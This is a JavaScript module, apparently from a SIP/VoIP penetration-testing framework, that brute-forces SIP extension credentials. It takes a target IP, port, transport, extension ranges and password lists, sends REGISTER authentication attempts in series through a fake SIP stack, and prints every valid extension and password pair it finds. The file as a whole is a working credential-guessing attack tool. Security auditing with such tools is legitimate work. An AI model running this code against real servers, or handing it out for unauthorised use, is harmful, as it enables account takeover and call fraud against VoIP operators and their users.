/*
Copyright Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

'use strict';

var async  = require('async'),

    SipFakeStack = require('../utils/sipFakeStack'),
    sipParser    = require('../utils/sipParser'),
    printer      = require('../utils/printer'),
    utils        = require('../utils/utils');


module.exports = (function () {

    return {

        info : {
            name        : 'sipBrutePass',
            description : 'SIP credentials brute-force',
            options     : {
                target : {
                    description  : 'IP address to brute-force',
                    defaultValue : '127.0.0.1',
                    type         : 'targetIp'
                },
                port : {
                    description  : 'Port of the server',
                    defaultValue : 5060,
                    type         : 'port'
                },
                transport : {
                    description  : 'Underlying protocol',
                    defaultValue : 'UDP',
                    type         : 'protocols'
                },
                tlsType : {
                    description  : 'Version of TLS protocol to use (only when TLS)',
                    defaultValue : 'SSLv3',
                    type         : 'tlsType'
                },
                wsPath : {
                    description  : 'Websockets path (only when websockets)',
                    defaultValue : 'ws',
                    type         : 'anyValue'
                },
                extensions : {
                    description  : 'Extension, range (ie: range:0000-0100) or file with them to test',
                    defaultValue : 'range:100-110',
                    type         : 'userPass'
                },
                passwords : {
                    description  : 'Password (or file with them) to test',
                    defaultValue : 'guest',
                    type         : 'userPass'
                },
                userAsPass : {
                    description  : 'Test the same user as password for each one.',
                    defaultValue : 'yes',
                    type         : 'yesNo'
                },
                meth : {
                    description  : 'Type of SIP packets to do the requests',
                    defaultValue : 'REGISTER',
                    type         : 'sipRequests'
                },
                srcHost : {
                    description  : 'Source host to include in the  SIP request',
                    defaultValue : 'random',
                    type         : 'targetIpRand'
                },
                srcPort : {
                    description  : 'Source port to include in the  SIP request',
                    defaultValue : 'random',
                    type         : 'portRand'
                },
                domain : {
                    description  : 'Domain to explore ("ip" to use the target)',
                    defaultValue : 'ip',
                    type         : 'domainIp'
                },
                delay : {
                    description  : 'Delay between requests in ms.',
                    defaultValue : 0,
                    type         : 'positiveInt'
                },
                timeout : {
                    description  : 'Time to wait for the first response, in ms.',
                    defaultValue : 5000,
                    type         : 'positiveInt'
                },
            }
        },

        run : function (options, callback) {

            var loginPairs  = utils.createLoginPairs(
                    options.extensions,
                    options.passwords,
                    options.userAsPass
                ),
                result      = {
                    valid  : [],
                    errors : []
                },
                recErrors      = [],
                indexCount  = 0, // User with delay to know in which index we are
                tmpUser;

            // We avoid to parallelize here to control the interval of the requests
            async.eachSeries(loginPairs, function (loginPair, asyncCb) {
                // We use a new stack in each request to simulate different users
                var stackConfig = {
                    server    : options.target    || null,
                    port      : options.port      || '5060',
                    transport : options.transport || 'UDP',
                    timeout   : options.timeout   || 10000,
                    wsPath    : options.wsPath    || null,
                    tlsType   : options.tlsType   || 'SSLv3',
                    srcHost   : options.srcHost   || null,
                    lport     : options.srcPort   || null,
                    domain    : options.domain    || null
                },
                fakeStack, msgConfig;

                msgConfig = {
                    meth    : options.meth,
                    fromExt : loginPair.user,
                    pass    : loginPair.pass
                };

                indexCount += 1;
                fakeStack = new SipFakeStack(stackConfig);

                fakeStack.authenticate(msgConfig, function (err, res) {
                    if (!err) {
                        if (res.valid) {
                            result.valid.push({
                                extension : loginPair.user,
                                pass      : loginPair.pass,
                                data      : res.data
                            });
                            // We only add valid extensions to final result
                            printer.highlight('Valid credentials found: ' +
                                               loginPair.user + ' | ' + loginPair.pass);
                        } else {
                            // but we print info about tested ones
                            printer.infoHigh('Valid credentials NOT found for: ' +
                                loginPair.user + ' | ' + loginPair.pass);
                        }

                        // Last element
                        if (indexCount === loginPairs.length) {
                            asyncCb();
                        } else {
                            setTimeout(asyncCb, options.delay);
                        }
                    } else {
                        // We don't want to stop the full chain
                        result.errors.push({
                            extension : loginPair.user,
                            pass      : loginPair.pass,
                            data      : err
                        });
                        asyncCb();
                    }
                });
            }, function (err) {
                callback(err, result);
            });
        }
    };

}());
